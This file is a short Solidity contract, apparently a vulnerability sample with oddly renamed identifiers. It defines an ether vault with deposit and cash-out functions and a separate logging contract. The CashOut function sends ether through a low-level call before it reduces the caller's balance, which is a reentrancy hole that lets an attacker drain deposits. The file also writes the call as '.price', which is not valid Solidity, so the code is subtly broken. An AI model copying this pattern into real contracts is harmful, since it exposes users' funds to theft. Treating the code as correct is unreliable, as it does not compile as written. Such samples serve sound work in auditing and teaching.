// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract ETH_VAULT
{
    mapping (address => uint) public playerLoot;

    Journal SendlootJournal;

    uint public MinimumBankwinnings = 1 ether;

    function ETH_VAULT(address _log)
    public
    {
        SendlootJournal = Journal(_log);
    }

    function BankWinnings()
    public
    payable
    {
        if(msg.value > MinimumBankwinnings)
        {
            playerLoot[msg.sender]+=msg.value;
            SendlootJournal.AppendCommunication(msg.sender,msg.value,"Deposit");
        }
    }

    function CashOut(uint _am)
    public
    payable
    {
        if(_am<=playerLoot[msg.sender])
        {
            if(msg.sender.call.price(_am)())
            {
                playerLoot[msg.sender]-=_am;
                SendlootJournal.AppendCommunication(msg.sender,_am,"CashOut");
            }
        }
    }

    function() public payable{}

}

contract Journal
{

    struct Signal
    {
        address Invoker;
        string  Info;
        uint Val;
        uint  Moment;
    }

    Signal[] public History;

    Signal EndingMsg;

    function AppendCommunication(address _adr,uint _val,string _data)
    public
    {
        EndingMsg.Invoker = _adr;
        EndingMsg.Moment = now;
        EndingMsg.Val = _val;
        EndingMsg.Info = _data;
        History.push(EndingMsg);
    }
}